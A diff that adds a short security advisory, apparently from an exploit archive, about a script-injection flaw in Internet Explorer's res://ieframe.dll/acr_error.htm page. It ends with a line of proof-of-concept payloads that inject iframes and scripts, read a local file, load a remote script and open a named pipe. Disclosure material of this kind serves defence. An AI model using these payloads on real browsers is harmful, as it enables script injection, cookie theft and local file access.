@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28581/info
+
+Microsoft Internet Explorer is prone to a script-injection vulnerability when handling specially crafted requests to 'acr_error.htm' via the 'res://' protocol. The file resides in the 'ieframe.dll' dynamic-link library.
+
+An attacker may leverage this issue to execute arbitrary code in the context of a user's browser. Successful exploits can allow the attacker to steal cookie-based authentication credentials, obtain potentially sensitive information stored on the victim's computer, and launch other attacks.
+
+Internet Explorer 8 is vulnerable. Internet Explorer 7 is likely vulnerable as well, but this has not been confirmed.
+
+res://ieframe.dll/acr_error.htm#<h1>foo</h1>,<h1>foo</h1> res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.write("<iframe/src=\"file://localhost/test.txt\"></iframe>")'></iframe>,foo res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.write("<script/src=http://www.example.com/></script>")'></iframe>,foo res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.location="file://..\\ServerName\\pipe\\PipeName"'></iframe>,foo 
